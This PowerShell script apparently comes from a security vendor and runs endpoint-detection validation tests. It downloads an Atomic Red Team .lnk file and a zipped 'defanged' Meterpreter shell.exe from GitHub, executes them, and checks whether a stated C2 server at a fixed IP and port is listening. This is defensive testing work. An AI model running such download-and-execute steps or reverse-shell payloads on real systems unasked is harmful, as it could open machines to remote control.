# Function to display the logo
function Show-Logo {
    Write-Host @"                                                                           
                                                                                                @@@      
                                                                                             @@@ @ @@@@  
                                                                                           @@@ @ @@@ @   
                                                                                        @@@@ @@@@ @  @@@ 
                                                                                     /@@@ @@@@  @@@@@ @  
                                                                                  #@@. @@@@ @@@@@ &@     
                                                                               @@@@@@@@  @@@   @@@@@@&   
                                                                            @@@@@@@@@@@@  @@@@@@ @@      
                                                                         @@@@@@@@@@@@@@@@   @@@@@@       
                                                                      @@@@@@@@@@@@@ %@@@@@   @@          
                                                  @@               @@@@    @@@@@@@@   @@@@@@@.@          
                                             @@@@ @@@@          @@@@       @@@@@@@@      @@              
                                          @@@     @@@@@@      @@@@       @@@@@@@@@@@@  @                 
                                       @@@@            @@@   @@@       @@@@@@@@@@@@@@ @                  
                                       @@               @@@ @@@       @@@@@@@  @@@@                      
                                        @@              @@@@@@      @@@@@@@@@@  @@                       
                                         @@              @@@@      @@@@@@@@@@@@                          
                                          @(          /@@@        @@@@@    @                             
                                          @@       @@@@          @@@@@@@@ @                              
                                          @ @@@@@@@#             /@@@@@@@                                
                                        @@@@@@@                    @@@@ @                                
                                      @  @@@@@                       @@@@                                
                                    @  @@@@             @@/            @@@@@@                            
                                   @ %@@ @@  @@@@@@@@,   @@         ,@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                    @ @@         @@@@@  @@@@@@@@@@@  ,@@@@@@@@@@@@,@@% ,@@@@@@@          
                                     @           @@@@@ @@                  &@@& @@  @@@@@@               
                                                @@@@@@@*                                                 
                                               @@@ @@         TRIFIDENT VALIDATION                                           
                                            @@   @            - POWERSHELL TESTS -                                            
                                         @@ @@@@@                                                         
                                             @                       
"@
}

function Get-OSType {
    $unameOutput = $(uname -s)

    if ($unameOutput -eq "Darwin") {
        $os = "macOS"
        $color = "Yellow"
    } elseif ($unameOutput -eq "Linux") {
        $os = "Linux"
        $color = "Green"
    } elseif ($unameOutput -eq "WindowsNT" -or $unameOutput -eq "MINGW32_NT-10.0" -or $unameOutput -eq "MINGW64_NT-10.0") {
        $os = "Windows"
        $color = "Cyan"
    } else {
        $os = "Unknown"
        $color = "Red"
    }

    # Print the operating system with color and bold style
    Write-Host -NoNewline "Operating System: " -ForegroundColor $color -BackgroundColor Black
    Write-Host -NoNewline "$os" -ForegroundColor $color -BackgroundColor Black
    Write-Host " (Selecting appropriate tests)`n"
    Log-Message "Operating System: $os"
}



function Test-C2-Port {
    $IPAddress = "172.174.245.183"
    $Port = 9191
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($IPAddress, $Port)
        $tcpClient.Close()
        Log-Message "C2 IS CURRENTLY LISTENING and Operational" ""
    } catch {
        Log-Message "C2 Server is NOT LISTENING (PORT NOT ACCESSIBLE)"
    }
}


function Test-SMTPAuthentication {
    do {
        # Prompt the user for SMTP server, username, and password
        $SmtpServer = "mail.smtp2go.com"
        $Username = "ValidationScript"
        $SecurePassword = $ScriptPassword

        # Create a credential object
        $Credentials = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

        # Attempt to connect to the SMTP server and authenticate
        try {
            $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer)
            $SMTPClient.EnableSsl = $true
            $SMTPClient.Credentials = $Credentials
            $SMTPClient.Timeout = 5000  # Set timeout to 5 seconds
            Log-Message "Attempting Script Authentication"
            $SMTPClient.Send("ValidationScript@trifident.com", "to@example.com", "", "")

            # If no exception is thrown, authentication was successful
            Log-Message "Authentication successful. Proceeding with the script..."
            return 
        } catch {
            # If an exception is thrown, authentication failed
            Log-Message "Authentication failed. Please check your credentials and try again."
            $ScriptPassword = Get-Script-Password
        }
    } while ($true)  # Continue prompting until successful authentication
}


function Get-Script-Password {
    # Prompt the user for a password without showing the username prompt
    Write-Host -NoNewline "Please enter the password provided by TRIFIDENT: "
    $SecurePassword = Read-Host -AsSecureString

    # Convert the secure string password to plain text
    # Convert the secure string password to plain text
    $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($SecurePassword)
    $password = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)

    # Use the entered password (example)
    #Write-Host "Password: $password"
    return $SecurePassword
}

function Log-Message {
    param(
        [string]$Message,
        [string]$Error
    )

    # Get current timestamp in UTC
    $TimestampUtc = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss UTC")

    # Convert UTC timestamp to Eastern time
    $TimeZone = [System.TimeZoneInfo]::FindSystemTimeZoneById("Eastern Standard Time")
    $TimestampEastern = [System.TimeZoneInfo]::ConvertTimeFromUtc([DateTime]::ParseExact($TimestampUtc, "yyyy-MM-dd HH:mm:ss UTC", $null), $TimeZone).ToString("yyyy-MM-dd HH:mm:ss EST")

    # Format log message with both timestamps
    $LogMessage = "[$TimestampUtc | $TimestampEastern] $Message"
    if ($Error) {
        $LogMessage = "[!] $LogMessage Error: $Error"
        Write-Host $LogMessage -ForegroundColor Red
    } elseif ($Error -eq '') {
        $LogMessage = "[+] $LogMessage"
        Write-Host $LogMessage -ForegroundColor DarkGray
    }

    # Append log message to log file
    Add-Content -Path "logfile.txt" -Value $LogMessage
}



# Function to run commands 
function Run-AtomicTest1-Windows {
    Log-Message "Run-AtomicTest1-Windows: Starting"
    Write-Host "
    Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
    ------------------------------------
    
    LNK files are based on the Shell Link Binary file format, also known as Windows
    shortcuts. But what seems a relatively simple ability to execute other binaries 
    on the system can inflict great harm when abused by threat actors. Microsoft’s 
    decision to block macros by default for files downloaded from the internet in Office 
    applications provoked malware developers to shift to other techniques.
    
    This test downloads a crafted .lnk (Atomic RedTeam) from Trifident's github repository, and 
    then attempts to execute it. When executed, the .lnk file attempts to download a clean 
    copy of Putty (a windows based ssh client) as 'a.exe' and attempts to execute it.

    ------------------------------------
    Expected Outcome: EDR detects, alerts, and quarantines the LNK file, however
    Putty still executes.
    
    "
    
    # First URL to download
    $T1204002Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/test10.lnk"
    
    # Second URL to download (provide your own URL)
    $T1204002Url2 = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"

    $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
    if ($confirmation -ne "Y") {
            Log-Message "Run-AtomicTest1-Windows: Cancelled test"
            Write-Host "Exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Log-Message "Run-AtomicTest1-Windows: Downloading LNK file"
        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url -ErrorAction Stop
        Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
    }
    catch {
        # If an error occurs, display the error message
        Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url): $_" -Error $_.Exception.Message
        Log-Message "Run-AtomicTest1-Windows:Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url2 -ErrorAction Stop
            Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url2): $_" -Error $_.Exception.Message
            Log-Message "Run-AtomicTest1-Windows: Unsuccessful Download from both URLs"
            return
        }
    }

    # The test file has been saved to $temp\test10.lnk
    $lnkFile = Join-Path $tempDirectory "test10.lnk"

    # Execute the downloaded file
    try {
        Log-Message "Run-AtomicTest1-Windows: Executing the downloaded file: $lnkFile"
        Start-Process $lnkFile
    } catch {
        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
    }
    

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Kill the process named "a.exe"
    try {
        Log-Message "Run-AtomicTest1-Windows: Killing the a.exe (putty) process"
        taskkill /IM a.exe /F
    } catch {
        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
    }

    # Removing all downloaded or created files
    Log-Message "Run-AtomicTest1-Windows: Removing all downloaded or created files"
    $file2 = Join-Path $tempDirectory "a.exe"
    Remove-Item $lnkFile -ErrorAction Ignore
    Remove-Item $file2 -ErrorAction Ignore
}

function Run-AtomicTest2-Windows {
    Log-Message "Run-AtomicTest2-Windows: Starting"

    # Write the test description
    Write-Host "
    Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
    ------------------------------------
    
    Meterpreter is a Metasploit attack payload that provides an interactive shell to the
    attacker from which to explore the target machine and execute code. Meterpreter is
    deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in
    memory and writes nothing to disk. It communicates over the stager socket and provides
    a comprehensive client-side Ruby API. It features command history, tab completion,
    channels, and more.

    Shell.exe attempts to shovel a meterpreter shell from the host machine to a Trifident
    owned C2 server over HTTP (port 9191) located in Azure at the IP address of
    172.174.245.183. The C2 meterpreter listener is disabled by default on our C2 server. If
    execution succeeds, the C2 channel will not be established. 
    
    ------------------------------------
    Expected Outcome: EDR detects, alerts, and quarantines shell.exe without execution.
    "

    # Log the C2 server validation
    Write-Host "    Validating the C2 server is " -NoNewline
    Write-Host "non-operational" -ForegroundColor Green -NoNewline
    Write-Host " prior to execution: "
    Test-C2-Port
    
    # First URL to download
    $T12040022Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
    
    # Second URL to download (provide your own URL)
    $T12040022Url2 = "YOUR_SECOND_URL_HERE"
    # Log the user confirmation
    $confirmation = Read-Host "`nDo you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
    Log-Message "User confirmation: $confirmation"
    if ($confirmation -ne "Y") {
        Write-Host "Exiting script..."
        return
    }

    # Attempt to download the file from the first URL
    try {
        Log-Message "Downloading shell-trifident.zip from first URL"
        Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url -ErrorAction Stop
        Log-Message "File downloaded successfully from $T12040022Url"
    }
    catch {
        # If the first attempt fails, try the second URL
        Log-Message "Error downloading file from $T12040022Url" -Error $_.Exception.Message
        Log-Message "Trying second URL"
        try {
            Log-Message "Downloading shell-trifident.zip from second URL"
            Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url2 -ErrorAction Stop
            Log-Message "File downloaded successfully from $T12040022Url2"
        }
        catch {
            # If both attempts fail, log the error and exit
            Log-Message "Error downloading file from $T12040022Url2" -Error $_.Exception.Message
            Log-Message "Failed to download the file from both URLs"
            return
        }
    }
    $zipFile = Join-Path $tempDirectory "shell-trifident.zip"
    # Unzip the downloaded file
    if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
        Log-Message "7Zip4Powershell module Not installed, installing" ""
        Install-Module -Name 7Zip4Powershell -Force
        Log-Message "7Zip4Powershell module installed"
    } else {
        Log-Message "7Zip4Powershell module is already installed."
    }
    try {
        if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
            Log-Message "Unzipping shell-trifident.zip"
            $ErrorActionPreference = "Stop"  # Set $ErrorActionPreference to "Stop"
            Expand-7Zip -ArchiveFileName $zipFile -Password "trifident" -TargetPath $tempDirectory
            $ErrorActionPreference = "Continue"  # Reset $ErrorActionPreference
            Log-Message "shell-trifident.zip unpacked to $tempDirectory"
        } else {
            Log-Message "Unable to unzip the file because the 7Zip4Powershell module is not available."
            return
        }
    } catch {
        #This errors if script is running on a non-Windows OS.  This should never happen.
        Log-Message "Error unpacking shell-trifident.zip to $tempDirectory" -Error $_.Exception.Message
    }
    

    
    $executeFile = Join-Path $tempDirectory "shell.exe"
    # Execute the downloaded file
    Log-Message "Executing $executeFile"
    Start-Process $executeFile

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Terminate the process
    taskkill /IM shell.exe /F
    Log-Message "Terminated $executeFile process"

    # Clean up - remove downloaded files
    Log-Message "Removing all downloaded or created files"
    $filesToRemove = $zipFile, $executeFile
    foreach ($file in $filesToRemove) {
        Remove-Item $file -ErrorAction Ignore
        Log-Message "Removed $file"
    }

    Log-Message "Run-AtomicTest2-Windows: Completed"
}


Log-Message "Starting script execution..."
# Call the function to display the logo and begin tests
Show-Logo
Get-OSType
# Prompt the user for execution password
$ScriptPassword = Get-Script-Password
Test-SMTPAuthentication



# Get the temporary directory path
$tempDirectory = [System.IO.Path]::GetTempPath()
Run-AtomicTest1-Windows
Run-AtomicTest2-Windows
